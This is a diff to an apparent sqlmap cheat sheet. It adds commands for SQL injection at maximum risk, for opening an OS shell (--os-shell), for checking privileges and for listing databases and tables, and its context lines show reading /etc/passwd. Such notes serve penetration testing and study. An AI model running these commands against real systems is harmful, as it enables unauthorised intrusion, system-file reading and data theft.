@@ -1,3 +1,11 @@
+Main
+```bash
+sqlmap ... --batch  --level=5 --risk=3 --technique=BEU
+sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --privilege
+sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --os-shell
+sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --dbs
+sqlmap ... --batch  --level=5 --risk=3 --technique=BEU -D testDB --tables
+```
 Advanced help
 ```shell
 sqlmap -hh
@@ -137,6 +145,10 @@ sqlmap ... --tamper=between,randomcase
 sqlmap ... --list-tampers
 ```
 ### OS Exploitation
+View privileges
+```bash
+sqlmap ... --privilege
+```
 Need to be database administrator to preform the following
 ```shell 
 sqlmap ...  --file-read "/etc/passwd"
